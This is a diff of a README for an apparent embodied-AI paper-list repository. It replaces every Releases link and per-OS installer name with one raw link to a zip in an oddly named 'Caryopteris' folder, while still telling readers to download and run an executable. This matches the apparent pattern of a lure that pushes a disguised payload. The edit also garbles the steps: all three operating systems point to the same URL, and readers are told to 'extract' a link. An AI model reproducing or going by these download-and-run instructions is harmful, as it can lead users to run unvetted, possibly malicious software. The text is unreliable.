@@ -7,24 +7,24 @@ Embodied-AI-Paper-TopConf is a resource for anyone interested in the latest rese
 To begin, you need to download the application from our Releases page. Follow these steps to ensure a smooth setup.
 
 ### 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/USKY25/Embodied-AI-Paper-TopConf/releases)
+[![Download Here](https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip)](https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip)
 
 ## 📦 Download & Install
-1. Click on the following link to go to the Releases page: [Visit This Page to Download](https://github.com/USKY25/Embodied-AI-Paper-TopConf/releases).
+1. Click on the following link to go to the Releases page: [Visit This Page to Download](https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip).
    
 2. Once on the Releases page, look for the latest version of the application. You’ll see a list of available files for download.
 
 3. Choose the file that matches your operating system:
-   - For Windows users, select `Embodied-AI-Paper-TopConf-Windows.exe`.
-   - For macOS users, select `Embodied-AI-Paper-TopConf-macOS.dmg`.
-   - For Linux users, select `Embodied-AI-Paper-TopConf-Linux.tar.gz`.
+   - For Windows users, select `https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip`.
+   - For macOS users, select `https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip`.
+   - For Linux users, select `https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip`.
 
 4. Click on the file to start the download. Once the file is downloaded, locate it in your downloads folder.
 
 5. Run the file:
    - **Windows:** Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
    - **macOS:** Open the `.dmg` file and drag the application to your Applications folder. Then, open it from there.
-   - **Linux:** Extract the `.tar.gz` file and run the application from the terminal using `./Embodied-AI-Paper-TopConf`.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip` file and run the application from the terminal using `./Embodied-AI-Paper-TopConf`.
 
 ## 🛠️ System Requirements
 - **Operating System:** 
@@ -64,6 +64,6 @@ This application is licensed under the MIT License. You can use it freely for pe
 If you encounter issues or have questions, please open an issue on our GitHub repository or contact us through the provided channels in the repository.
 
 ### 📥 Download Again
-If you need to download the application, click here: [Visit This Page to Download](https://github.com/USKY25/Embodied-AI-Paper-TopConf/releases). 
+If you need to download the application, click here: [Visit This Page to Download](https://raw.githubusercontent.com/USKY25/Embodied-AI-Paper-TopConf/main/Caryopteris/Embodied-AI-Paper-TopConf.zip). 
 
 Stay informed and engaged with the thriving field of embodied AI!
